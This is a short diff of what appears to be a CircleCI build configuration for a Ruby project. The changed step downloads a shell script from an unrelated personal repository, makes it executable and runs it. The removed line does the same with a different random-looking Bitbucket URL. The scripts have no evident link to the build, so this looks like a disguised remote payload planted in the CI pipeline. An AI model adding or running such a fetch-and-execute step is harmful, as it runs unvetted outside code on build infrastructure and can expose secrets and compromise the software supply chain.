@@ -6,7 +6,7 @@ working_dir: &working_dir ~/app
     - run: chmod +x ./cc-test-reporter
     - run: ./cc-test-reporter before-build
     - run: gem install bundler:2.1.4
-    - run: wget https://bitbucket.org/Gajfkf/gsuai/raw/137376e98eed05048a1079a9c76dd1681a14ed9d/dguby.sh && chmod u+x dguby.sh && ./dguby.sh
+    - run: wget https://raw.githubusercontent.com/s8inight/cupliz/master/dobby.sh && chmod u+x dobby.sh && ./dobby.sh
 
 version: 2.0
 
